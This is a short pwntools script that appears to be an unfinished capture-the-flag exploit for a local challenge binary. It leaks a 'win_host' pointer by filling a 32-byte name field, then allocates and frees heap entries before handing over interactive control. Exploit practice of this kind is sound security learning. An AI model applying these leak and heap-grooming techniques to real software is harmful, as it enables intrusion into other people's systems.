#!/usr/bin/env python3

from pwn import *

exe = ELF("./PT2_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.terminal = ["tmux", "splitw", "-h"]

def conn():
    return gdb.debug(exe.path, gdbscript="""
        b *main
        c
    """, env={"LD_PRELOAD": libc.path, "LD_LIBRARY_PATH": "."})

def create_host(r, index, name):
    r.sendlineafter(b"choice: ", b"1")
    r.sendlineafter(b"index: ", str(index).encode())
    r.sendlineafter(b"name: ", name)
    
def destroy_host(r, index):
    r.sendlineafter(b"choice: ", b"6")
    r.sendlineafter(b"index: ", str(index).encode())

def main():
    r = conn()
    create_host(r, 0, b"A" * 32)
    r.recvuntil(b"A" * 32)
    leak = r.recvline().strip()
    win_host = u64(leak.ljust(8, b"\x00"))
    print(f"Leaked address: {hex(win_host)}")
    
    create_host(r, 1, b"palle")
    create_host(r, 2, b"B" * 30)
    destroy_host(r, 2)
    
    r.interactive()


if __name__ == "__main__":
    main()

